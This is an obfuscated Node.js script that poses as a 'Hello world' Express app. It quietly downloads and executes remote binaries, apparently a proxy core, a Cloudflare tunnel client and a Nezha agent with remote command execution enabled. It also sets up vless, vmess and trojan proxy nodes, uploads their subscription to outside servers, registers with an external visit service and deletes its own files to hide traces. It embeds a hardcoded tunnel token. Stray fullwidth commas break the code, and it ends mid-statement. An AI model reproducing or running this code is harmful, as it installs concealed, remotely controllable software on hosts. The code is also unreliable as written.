const _0x49ef8d=_0xa191;(function(_0x39a18a,_0x5c3dce){const _0xcee1a9=_0xa191,_0x17b209=_0x39a18a();while(!![]){try{const _0x36d931=-parseInt(_0xcee1a9(0xa5))/0x1*(-parseInt(_0xcee1a9(0xea))/0x2)+parseInt(_0xcee1a9(0x12b))/0x3+parseInt(_0xcee1a9(0xee))/0x4*(-parseInt(_0xcee1a9(0xd9))/0x5)+parseInt(_0xcee1a9(0xab))/0x6*(-parseInt(_0xcee1a9(0xa9))/0x7)+-parseInt(_0xcee1a9(0x13f))/0x8*(-parseInt(_0xcee1a9(0x11d))/0x9)+-parseInt(_0xcee1a9(0x128))/0xa*(-parseInt(_0xcee1a9(0x93))/0xb)+parseInt(_0xcee1a9(0xeb))/0xc*(-parseInt(_0xcee1a9(0xf4))/0xd);if(_0x36d931===_0x5c3dce)break;else _0x17b209['push'](_0x17b209['shift']());}catch(_0x1fe610){_0x17b209['push'](_0x17b209['shift']());}}}(_0x568b,0x741cd));const express=require(_0x49ef8d(0xb5)),app=express(),axios=require(_0x49ef8d(0xaf)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x49ef8d(0x87)),exec=promisify(require(_0x49ef8d(0xd1))[_0x49ef8d(0xec)]),{execSync}=require(_0x49ef8d(0xd1)),UPLOAD_URL=process[_0x49ef8d(0xc2)][_0x49ef8d(0x8d)]||'',PROJECT_URL=process['env'][_0x49ef8d(0xe8)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x49ef8d(0xc2)][_0x49ef8d(0x7d)]||_0x49ef8d(0x10b),SUB_PATH=process[_0x49ef8d(0xc2)][_0x49ef8d(0x95)]||_0x49ef8d(0xa3),PORT=process[_0x49ef8d(0xc2)][_0x49ef8d(0x9a)]||process[_0x49ef8d(0xc2)]['PORT']||0xbb8,UUID=process['env'][_0x49ef8d(0x13c)]||_0x49ef8d(0x129),NEZHA_SERVER=process['env'][_0x49ef8d(0x86)]||'',NEZHA_PORT=process[_0x49ef8d(0xc2)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x49ef8d(0xc2)][_0x49ef8d(0xf8)]||'',ARGO_DOMAIN=process[_0x49ef8d(0xc2)][_0x49ef8d(0x121)]||_0x49ef8d(0x134),ARGO_AUTH=process[_0x49ef8d(0xc2)][_0x49ef8d(0xf3)]||_0x49ef8d(0x139),ARGO_PORT=process[_0x49ef8d(0xc2)][_0x49ef8d(0xb7)]||0x1f41,CFIP=process[_0x49ef8d(0xc2)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x49ef8d(0xc2)][_0x49ef8d(0x13b)]||0x1bb,NAME=process[_0x49ef8d(0xc2)][_0x49ef8d(0xa1)]||'u';!fs[_0x49ef8d(0xb2)](FILE_PATH)?(fs[_0x49ef8d(0xe4)](FILE_PATH),console[_0x49ef8d(0x7f)](FILE_PATH+'\x20is\x20created')):console[_0x49ef8d(0x7f)](FILE_PATH+_0x49ef8d(0x131));function _0x568b(){const _0x26e0c1=['\x20-c\x20','Error\x20reading\x20boot.log:','taskkill\x20/f\x20/im\x20','nohup\x20','NEZHA_SERVER','util','https://amd64.ssss.nyc.mn/web','forEach','then','\x20>/dev/null\x202>&1','&path=%2Fvless-argo%3Fed%3D2560#','UPLOAD_URL','stream','Empowerment\x20success\x20for\x20','tunnel.json','web\x20running\x20error:\x20','&fp=firefox&type=ws&host=','15598EUpSvR','Nodes\x20uploaded\x20successfully','SUB_PATH','https://amd64.ssss.nyc.mn/v1','trojan','map','substring','SERVER_PORT','application/json','automatic\x20access\x20task\x20added\x20successfully','.exe\x20>\x20nul\x202>&1','clear','stringify','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NAME','?security=tls&sni=','sub','finish','2nGzWlw','message','post','--tls','1285522ycQQJw','pkill\x20-f\x20\x22[','6PEaYzG','random','2087','filter','axios','https://arm64.ssss.nyc.mn/bot','vless','existsSync','join','443','express','?encryption=none&security=tls&sni=','ARGO_PORT','tunnel.yml','/vmess-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Error\x20downloading\x20files:','Empowerment\x20failed\x20for\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','includes','/tunnel.yml\x20run','boot.log','unlinkSync','env','/api/delete-nodes','split','status','abcdefghijklmnopqrstuvwxyz','send','none','ArgoDomain:','true','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','pipe','\x0a\x20\x20\x0avmess://','tcp','readdirSync','child_process','error','127.0.0.1','/vmess-argo?ed=2560','https+local://8.8.8.8/dns-query','\x20>/dev/null\x202>&1\x20&','writeFileSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','50MQzoyc','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://oooo.serv00.net/add-url','2083','firefox','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/vless-argo','2096','push','mkdirSync','list.txt','\x20is\x20running','length','PROJECT_URL','match','903894vlnuRx','7563660VZlImx','exec','\x0aclient_secret:\x20','273472dXdJAY','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','test','freedom','\x0a\x20\x20credentials-file:\x20','ARGO_AUTH','13AhDTZp','arch','win32','utf-8','NEZHA_KEY','set','statSync','basename','NEZHA\x20variable\x20is\x20empty,skip\x20running','aarch64','listen','Error\x20executing\x20command:\x20','pop','Error\x20in\x20startserver:','config.yaml','/api/add-subscriptions','/sub.txt\x20saved\x20successfully','Hello\x20world!','trim','readFileSync','\x22\x20>\x20/dev/null\x202>&1','http','catch','./tmp','/dev/null','unshift','platform','del\x20/f\x20/q\x20','arm','Subscription\x20uploaded\x20successfully','App\x20is\x20running','\x20-c\x20\x22','tls','\x20-s\x20','blackhole','direct','get','all','Unhandled\x20error\x20in\x20startserver:','8443','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','27rauTEg','amd','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20tunnel:\x20','ARGO_DOMAIN','config.json','https://arm64.ssss.nyc.mn/web','\x20>\x20nul\x202>&1','/api/add-nodes','\x20-p\x20','text/plain;\x20charset=utf-8','1030CrEDvW','2584b733-9095-4bec-a7d5-62b473540f7a','false','1434177fFojpG','Download\x20','\x0a\x20\x20\x20\x20','sub.txt','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Content-Type','\x20already\x20exists','base64','https://arm64.ssss.nyc.mn/agent','fac.chatgptaigode.eu.org','/trojan-argo','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','from','eyJhIjoiYTYxNjMxMzEwZWRiOTQ3MzVkNWM3OTExMmQyNTFkMGQiLCJ0IjoiNjY4M2MyNTktNmRkZC00MzBiLTg5OWYtZjQ1ZDU0OGFjNTBiIiwicyI6Ik1URTFOMkV3WVdFdE1EazFOeTAwTWpSa0xXSTJZVFl0WkRVMU1EbGxaRGt5TjJReiJ9','https://amd64.ssss.nyc.mn/agent','CFPORT','UUID','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','charAt','1187256iwFDcB','fileName','TunnelSecret','toString','FILE_PATH','createWriteStream','log','xtls-rprx-vision','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'];_0x568b=function(){return _0x26e0c1;};return _0x568b();}function generateRandomName(){const _0x4d8216=_0x49ef8d,_0x41c641=_0x4d8216(0xc6);let _0x970d68='';for(let _0x9828ef=0x0;_0x9828ef<0x6;_0x9828ef++){_0x970d68+=_0x41c641[_0x4d8216(0x13e)](Math['floor'](Math[_0x4d8216(0xac)]()*_0x41c641[_0x4d8216(0xe7)]));}return _0x970d68;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x49ef8d(0xb3)](FILE_PATH,npmName),phpPath=path[_0x49ef8d(0xb3)](FILE_PATH,phpName),webPath=path[_0x49ef8d(0xb3)](FILE_PATH,webName),botPath=path[_0x49ef8d(0xb3)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x49ef8d(0x12e)),listPath=path[_0x49ef8d(0xb3)](FILE_PATH,_0x49ef8d(0xe5)),bootLogPath=path['join'](FILE_PATH,_0x49ef8d(0xc0)),configPath=path[_0x49ef8d(0xb3)](FILE_PATH,'config.json');function deleteNodes(){const _0x379efb=_0x49ef8d;try{if(!UPLOAD_URL)return;if(!fs[_0x379efb(0xb2)](subPath))return;let _0x2886b0;try{_0x2886b0=fs['readFileSync'](subPath,_0x379efb(0xf7));}catch{return null;}const _0x13c3d6=Buffer[_0x379efb(0x138)](_0x2886b0,_0x379efb(0x132))[_0x379efb(0x142)](_0x379efb(0xf7)),_0x514bae=_0x13c3d6[_0x379efb(0xc4)]('\x0a')['filter'](_0xbb24a4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x379efb(0xf0)](_0xbb24a4));if(_0x514bae['length']===0x0)return;return axios[_0x379efb(0xa7)](UPLOAD_URL+_0x379efb(0xc3),JSON[_0x379efb(0x9f)]({'nodes':_0x514bae}),{'headers':{'Content-Type':_0x379efb(0x9b)}})[_0x379efb(0x10a)](_0x48f241=>{return null;}),null;}catch(_0x2da884){return null;}}function cleanupOldFiles(){const _0x21590c=_0x49ef8d;try{const _0x1d78c9=fs[_0x21590c(0xd0)](FILE_PATH);_0x1d78c9['forEach'](_0x394a6e=>{const _0x2254d8=_0x21590c,_0x5ecb7c=path[_0x2254d8(0xb3)](FILE_PATH,_0x394a6e);try{const _0x5314bc=fs[_0x2254d8(0xfa)](_0x5ecb7c);_0x5314bc['isFile']()&&fs[_0x2254d8(0xc1)](_0x5ecb7c);}catch(_0x5b9558){}});}catch(_0x1cfc55){}}app[_0x49ef8d(0x118)]('/',function(_0x43e723,_0x37d754){const _0x17b8cb=_0x49ef8d;_0x37d754['send'](_0x17b8cb(0x105));});async function generateConfig(){const _0x326d33=_0x49ef8d,_0x57355c={'log':{'access':_0x326d33(0x10c),'error':_0x326d33(0x10c),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x326d33(0xb1),'settings':{'clients':[{'id':UUID,'flow':_0x326d33(0x80)}],'decryption':_0x326d33(0xc8),'fallbacks':[{'dest':0xbb9},{'path':_0x326d33(0xe1),'dest':0xbba},{'path':_0x326d33(0xb9),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x326d33(0xcf)}},{'port':0xbb9,'listen':_0x326d33(0xd3),'protocol':_0x326d33(0xb1),'settings':{'clients':[{'id':UUID}],'decryption':_0x326d33(0xc8)},'streamSettings':{'network':_0x326d33(0xcf),'security':_0x326d33(0xc8)}},{'port':0xbba,'listen':_0x326d33(0xd3),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x326d33(0xc8)},'streamSettings':{'network':'ws','security':_0x326d33(0xc8),'wsSettings':{'path':_0x326d33(0xe1)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x326d33(0x114),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x326d33(0xd3),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x326d33(0xb9)}},'sniffing':{'enabled':!![],'destOverride':[_0x326d33(0x109),_0x326d33(0x114),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x326d33(0xd3),'protocol':_0x326d33(0x97),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x326d33(0xc8),'wsSettings':{'path':_0x326d33(0x135)}},'sniffing':{'enabled':!![],'destOverride':[_0x326d33(0x109),_0x326d33(0x114),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x326d33(0xd5)]},'outbounds':[{'protocol':_0x326d33(0xf1),'tag':_0x326d33(0x117)},{'protocol':_0x326d33(0x116),'tag':'block'}]};fs[_0x326d33(0xd7)](path[_0x326d33(0xb3)](FILE_PATH,_0x326d33(0x122)),JSON[_0x326d33(0x9f)](_0x57355c,null,0x2));}function getSystemArchitecture(){const _0x4259ad=_0x49ef8d,_0x504b21=os[_0x4259ad(0xf5)]();return _0x504b21===_0x4259ad(0x110)||_0x504b21==='arm64'||_0x504b21===_0x4259ad(0xfd)?_0x4259ad(0x110):_0x4259ad(0x11e);}function downloadFile(_0x26a018,_0x408bd5,_0x5de58b){const _0x3b0614=_0x49ef8d,_0x109e29=_0x26a018;!fs[_0x3b0614(0xb2)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x289dba=fs[_0x3b0614(0x7e)](_0x109e29);axios({'method':_0x3b0614(0x118),'url':_0x408bd5,'responseType':_0x3b0614(0x8e)})[_0x3b0614(0x8a)](_0x52085a=>{const _0x3db23d=_0x3b0614;_0x52085a['data'][_0x3db23d(0xcd)](_0x289dba),_0x289dba['on'](_0x3db23d(0xa4),()=>{const _0x4efb7a=_0x3db23d;_0x289dba['close'](),console[_0x4efb7a(0x7f)](_0x4efb7a(0x12c)+path[_0x4efb7a(0xfb)](_0x109e29)+'\x20successfully'),_0x5de58b(null,_0x109e29);}),_0x289dba['on']('error',_0x3d01d0=>{const _0xae9d1f=_0x3db23d;fs['unlink'](_0x109e29,()=>{});const _0x53810c='Download\x20'+path[_0xae9d1f(0xfb)](_0x109e29)+_0xae9d1f(0x137)+_0x3d01d0[_0xae9d1f(0xa6)];console[_0xae9d1f(0xd2)](_0x53810c),_0x5de58b(_0x53810c);});})[_0x3b0614(0x10a)](_0x331f0b=>{const _0x3ea433=_0x3b0614,_0x33f63e='Download\x20'+path[_0x3ea433(0xfb)](_0x109e29)+_0x3ea433(0x137)+_0x331f0b[_0x3ea433(0xa6)];console['error'](_0x33f63e),_0x5de58b(_0x33f63e);});}async function downloadFilesAndRun(){const _0xf8bbab=_0x49ef8d,_0x3aa549=getSystemArchitecture(),_0x338d16=getFilesForArchitecture(_0x3aa549);if(_0x338d16[_0xf8bbab(0xe7)]===0x0){console[_0xf8bbab(0x7f)](_0xf8bbab(0xe0));return;}const _0x46270f=_0x338d16[_0xf8bbab(0x98)](_0x496aa9=>{return new Promise((_0xd48cb0,_0x368155)=>{const _0x731cc8=_0xa191;downloadFile(_0x496aa9[_0x731cc8(0x140)],_0x496aa9['fileUrl'],(_0x44ac15,_0x247fae)=>{_0x44ac15?_0x368155(_0x44ac15):_0xd48cb0(_0x247fae);});});});try{await Promise[_0xf8bbab(0x119)](_0x46270f);}catch(_0x1232cb){console[_0xf8bbab(0xd2)](_0xf8bbab(0xbb),_0x1232cb);return;}function _0x1d3a63(_0x5c246c){const _0x17d522=_0xf8bbab,_0x2018cf=0x1fd;_0x5c246c[_0x17d522(0x89)](_0x1bee11=>{const _0x329376=_0x17d522;fs[_0x329376(0xb2)](_0x1bee11)&&fs['chmod'](_0x1bee11,_0x2018cf,_0x5c799a=>{const _0x20236f=_0x329376;_0x5c799a?console['error'](_0x20236f(0xbc)+_0x1bee11+':\x20'+_0x5c799a):console[_0x20236f(0x7f)](_0x20236f(0x8f)+_0x1bee11+':\x20'+_0x2018cf[_0x20236f(0x142)](0x8));});});}const _0x466a4c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1d3a63(_0x466a4c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x44450a=NEZHA_SERVER[_0xf8bbab(0xbe)](':')?NEZHA_SERVER[_0xf8bbab(0xc4)](':')[_0xf8bbab(0x100)]():'',_0x1a70bf=new Set([_0xf8bbab(0xb4),_0xf8bbab(0x11b),_0xf8bbab(0xe2),_0xf8bbab(0xad),'2083','2053']),_0x18361f=_0x1a70bf['has'](_0x44450a)?_0xf8bbab(0xca):_0xf8bbab(0x12a),_0x6977ad=_0xf8bbab(0xed)+NEZHA_KEY+_0xf8bbab(0xdb)+NEZHA_SERVER+_0xf8bbab(0xdf)+_0x18361f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xf8bbab(0xd7)](path[_0xf8bbab(0xb3)](FILE_PATH,_0xf8bbab(0x102)),_0x6977ad);const _0x28963d='nohup\x20'+phpPath+_0xf8bbab(0x113)+FILE_PATH+_0xf8bbab(0x12f);try{await exec(_0x28963d),console[_0xf8bbab(0x7f)](phpName+_0xf8bbab(0xe6)),await new Promise(_0x5a1970=>setTimeout(_0x5a1970,0x3e8));}catch(_0x3a8a71){console['error']('php\x20running\x20error:\x20'+_0x3a8a71);}}else{let _0x250562='';const _0x2a8d9b=[_0xf8bbab(0xb4),_0xf8bbab(0x11b),_0xf8bbab(0xe2),_0xf8bbab(0xad),_0xf8bbab(0xdd),'2053'];_0x2a8d9b[_0xf8bbab(0xbe)](NEZHA_PORT)&&(_0x250562=_0xf8bbab(0xa8));const _0x21842a=_0xf8bbab(0x85)+npmPath+_0xf8bbab(0x115)+NEZHA_SERVER+':'+NEZHA_PORT+_0xf8bbab(0x126)+NEZHA_KEY+'\x20'+_0x250562+_0xf8bbab(0x136);try{await exec(_0x21842a),console[_0xf8bbab(0x7f)](npmName+_0xf8bbab(0xe6)),await new Promise(_0x27791f=>setTimeout(_0x27791f,0x3e8));}catch(_0x1b9f81){console[_0xf8bbab(0xd2)]('npm\x20running\x20error:\x20'+_0x1b9f81);}}}else console['log'](_0xf8bbab(0xfc));const _0x30938c=_0xf8bbab(0x85)+webPath+_0xf8bbab(0x82)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x30938c),console[_0xf8bbab(0x7f)](webName+_0xf8bbab(0xe6)),await new Promise(_0x4c98da=>setTimeout(_0x4c98da,0x3e8));}catch(_0x1f22df){console[_0xf8bbab(0xd2)](_0xf8bbab(0x91)+_0x1f22df);}if(fs[_0xf8bbab(0xb2)](botPath)){let _0x539780;if(ARGO_AUTH[_0xf8bbab(0xe9)](/^[A-Z0-9a-z=]{120,250}$/))_0x539780=_0xf8bbab(0xcc)+ARGO_AUTH;else ARGO_AUTH[_0xf8bbab(0xe9)](/TunnelSecret/)?_0x539780=_0xf8bbab(0xba)+FILE_PATH+_0xf8bbab(0xbf):_0x539780='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xf8bbab(0x11f)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x539780+_0xf8bbab(0xd6)),console['log'](botName+_0xf8bbab(0xe6)),await new Promise(_0x1bfdf2=>setTimeout(_0x1bfdf2,0x7d0));}catch(_0x49d056){console[_0xf8bbab(0xd2)](_0xf8bbab(0xff)+_0x49d056);}}await new Promise(_0x244c9a=>setTimeout(_0x244c9a,0x1388));}function getFilesForArchitecture(_0xb35239){const _0xc46a61=_0x49ef8d;let _0x5157f4;_0xb35239===_0xc46a61(0x110)?_0x5157f4=[{'fileName':webPath,'fileUrl':_0xc46a61(0x123)},{'fileName':botPath,'fileUrl':_0xc46a61(0xb0)}]:_0x5157f4=[{'fileName':webPath,'fileUrl':_0xc46a61(0x88)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x45b8a6=_0xb35239==='arm'?_0xc46a61(0x133):_0xc46a61(0x13a);_0x5157f4[_0xc46a61(0x10d)]({'fileName':npmPath,'fileUrl':_0x45b8a6});}else{const _0x255122=_0xb35239===_0xc46a61(0x110)?'https://arm64.ssss.nyc.mn/v1':_0xc46a61(0x96);_0x5157f4[_0xc46a61(0x10d)]({'fileName':phpPath,'fileUrl':_0x255122});}}return _0x5157f4;}function argoType(){const _0x1fded4=_0x49ef8d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1fded4(0x7f)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1fded4(0xbe)](_0x1fded4(0x141))){fs['writeFileSync'](path[_0x1fded4(0xb3)](FILE_PATH,_0x1fded4(0x90)),ARGO_AUTH);const _0x255895=_0x1fded4(0x120)+ARGO_AUTH[_0x1fded4(0xc4)]('\x22')[0xb]+_0x1fded4(0xf2)+path['join'](FILE_PATH,_0x1fded4(0x90))+_0x1fded4(0xbd)+ARGO_DOMAIN+_0x1fded4(0xd8)+ARGO_PORT+_0x1fded4(0x81);fs[_0x1fded4(0xd7)](path[_0x1fded4(0xb3)](FILE_PATH,_0x1fded4(0xb8)),_0x255895);}else console[_0x1fded4(0x7f)](_0x1fded4(0x13d));}function _0xa191(_0x28f855,_0x230ea0){const _0x568b2d=_0x568b();return _0xa191=function(_0xa1915c,_0x304430){_0xa1915c=_0xa1915c-0x7d;let _0x32bd70=_0x568b2d[_0xa1915c];return _0x32bd70;},_0xa191(_0x28f855,_0x230ea0);}argoType();async function extractDomains(){const _0xd54a5a=_0x49ef8d;let _0x11e461;if(ARGO_AUTH&&ARGO_DOMAIN)_0x11e461=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x11e461),await _0x39236a(_0x11e461);else try{const _0x3837cd=fs[_0xd54a5a(0x107)](path[_0xd54a5a(0xb3)](FILE_PATH,'boot.log'),_0xd54a5a(0xf7)),_0xcfbbf=_0x3837cd[_0xd54a5a(0xc4)]('\x0a'),_0x92d4b5=[];_0xcfbbf[_0xd54a5a(0x89)](_0x34da52=>{const _0x2b0337=_0xd54a5a,_0xa149ee=_0x34da52[_0x2b0337(0xe9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xa149ee){const _0x44922f=_0xa149ee[0x1];_0x92d4b5[_0x2b0337(0xe3)](_0x44922f);}});if(_0x92d4b5[_0xd54a5a(0xe7)]>0x0)_0x11e461=_0x92d4b5[0x0],console[_0xd54a5a(0x7f)](_0xd54a5a(0xc9),_0x11e461),await _0x39236a(_0x11e461);else{console['log'](_0xd54a5a(0xcb)),fs[_0xd54a5a(0xc1)](path[_0xd54a5a(0xb3)](FILE_PATH,_0xd54a5a(0xc0)));async function _0x15d021(){const _0x2e2670=_0xd54a5a;try{process[_0x2e2670(0x10e)]===_0x2e2670(0xf6)?await exec(_0x2e2670(0x84)+botName+_0x2e2670(0x9d)):await exec(_0x2e2670(0xaa)+botName[_0x2e2670(0x13e)](0x0)+']'+botName[_0x2e2670(0x99)](0x1)+_0x2e2670(0x108));}catch(_0x2f18e6){}}_0x15d021(),await new Promise(_0x28ebaf=>setTimeout(_0x28ebaf,0xbb8));const _0x16fc50=_0xd54a5a(0x11c)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xd54a5a(0x85)+botPath+'\x20'+_0x16fc50+_0xd54a5a(0xd6)),console[_0xd54a5a(0x7f)](botName+'\x20is\x20running'),await new Promise(_0xd9446e=>setTimeout(_0xd9446e,0xbb8)),await extractDomains();}catch(_0x4b9612){console[_0xd54a5a(0xd2)](_0xd54a5a(0xff)+_0x4b9612);}}}catch(_0x44b5be){console['error'](_0xd54a5a(0x83),_0x44b5be);}async function _0x39236a(_0x52a0f2){const _0x2e0e20=_0xd54a5a,_0x19260a=execSync(_0x2e0e20(0xef),{'encoding':'utf-8'}),_0x10baff=_0x19260a[_0x2e0e20(0x106)](),_0x3074ce=NAME?NAME+'-'+_0x10baff:_0x10baff;return new Promise(_0xc25ca6=>{setTimeout(()=>{const _0x3ac988=_0xa191,_0x3c4af9={'v':'2','ps':''+_0x3074ce,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3ac988(0xc8),'net':'ws','type':_0x3ac988(0xc8),'host':_0x52a0f2,'path':_0x3ac988(0xd4),'tls':_0x3ac988(0x114),'sni':_0x52a0f2,'alpn':'','fp':_0x3ac988(0xde)},_0x1455db='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x3ac988(0xb6)+_0x52a0f2+_0x3ac988(0x92)+_0x52a0f2+_0x3ac988(0x8c)+_0x3074ce+_0x3ac988(0xce)+Buffer[_0x3ac988(0x138)](JSON[_0x3ac988(0x9f)](_0x3c4af9))['toString'](_0x3ac988(0x132))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x3ac988(0xa2)+_0x52a0f2+_0x3ac988(0x92)+_0x52a0f2+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3074ce+_0x3ac988(0x12d);console[_0x3ac988(0x7f)](Buffer['from'](_0x1455db)[_0x3ac988(0x142)](_0x3ac988(0x132))),fs[_0x3ac988(0xd7)](subPath,Buffer[_0x3ac988(0x138)](_0x1455db)[_0x3ac988(0x142)](_0x3ac988(0x132))),console[_0x3ac988(0x7f)](FILE_PATH+_0x3ac988(0x104)),uploadNodes(),app[_0x3ac988(0x118)]('/'+SUB_PATH,(_0x59eee5,_0x5562f3)=>{const _0x970aef=_0x3ac988,_0x13adad=Buffer[_0x970aef(0x138)](_0x1455db)['toString']('base64');_0x5562f3[_0x970aef(0xf9)](_0x970aef(0x130),_0x970aef(0x127)),_0x5562f3[_0x970aef(0xc7)](_0x13adad);}),_0xc25ca6(_0x1455db);},0x7d0);});}}async function uploadNodes(){const _0x4b1a34=_0x49ef8d;if(UPLOAD_URL&&PROJECT_URL){const _0x3ef8e0=PROJECT_URL+'/'+SUB_PATH,_0x4691db={'subscription':[_0x3ef8e0]};try{const _0x27edb1=await axios[_0x4b1a34(0xa7)](UPLOAD_URL+_0x4b1a34(0x103),_0x4691db,{'headers':{'Content-Type':_0x4b1a34(0x9b)}});return _0x27edb1&&_0x27edb1[_0x4b1a34(0xc5)]===0xc8?(console['log'](_0x4b1a34(0x111)),_0x27edb1):null;}catch(_0x44ed1d){if(_0x44ed1d['response']){if(_0x44ed1d['response'][_0x4b1a34(0xc5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4b1a34(0xb2)](listPath))return;const _0x9a4e26=fs[_0x4b1a34(0x107)](listPath,_0x4b1a34(0xf7)),_0x20c6fc=_0x9a4e26[_0x4b1a34(0xc4)]('\x0a')[_0x4b1a34(0xae)](_0x4108e8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4b1a34(0xf0)](_0x4108e8));if(_0x20c6fc['length']===0x0)return;const _0x538c59=JSON[_0x4b1a34(0x9f)]({'nodes':_0x20c6fc});try{const _0x37000a=await axios[_0x4b1a34(0xa7)](UPLOAD_URL+_0x4b1a34(0x125)，_0x538c59,{'headers':{'Content-Type':'application/json'}});return _0x37000a&&_0x37000a[_0x4b1a34(0xc5)]===0xc8?(console[_0x4b1a34(0x7f)](_0x4b1a34(0x94))，_0x37000a):null;}catch(_0x35ca79){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xe27cb1=_0xa191,_0x4d2645=[bootLogPath,configPath,webPath，botPath];if(NEZHA_PORT)_0x4d2645[_0xe27cb1(0xe3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4d2645[_0xe27cb1(0xe3)](phpPath);process['platform']===_0xe27cb1(0xf6)?exec(_0xe27cb1(0x10f)+_0x4d2645['join']('\x20')+_0xe27cb1(0x124),_0x562b8d=>{const _0x37d9f9=_0xe27cb1;console['clear']()，console[_0x37d9f9(0x7f)](_0x37d9f9(0x112))，console[_0x37d9f9(0x7f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x4d2645[_0xe27cb1(0xb3)]('\x20')+_0xe27cb1(0x8b)，_0x1b2712=>{const _0x43794e=_0xe27cb1;console[_0x43794e(0x9e)]()，console['log'](_0x43794e(0x112))，console[_0x43794e(0x7f)](_0x43794e(0xa0));});}，0x15f90);}cleanFiles();async function AddVisitTask(){const _0x31c45f=_0x49ef8d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x31c45f(0x7f)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x4d6077=await axios[_0x31c45f(0xa7)](_0x31c45f(0xdc)，{'url':PROJECT_URL},{'headers':{'Content-Type':_0x31c45f(0x9b)}});return console[_0x31c45f(0x7f)](_0x31c45f(0x9c))，_0x4d6077;}catch(_0x52c575){return console[_0x31c45f(0xd2)](_0x31c45f(0xda)+_0x52c575[_0x31c45f(0xa6)])，null;}}async function startserver(){const _0x296e70=_0x49ef8d;try{deleteNodes()，cleanupOldFiles()，await generateConfig()，await downloadFilesAndRun()，await extractDomains()，await AddVisitTask();}catch(_0x114474){console[_0x296e70(0xd2)](_0x296e70(0x101)，_0x114474);}}startserver()['catch'](_0x307a13=>{const 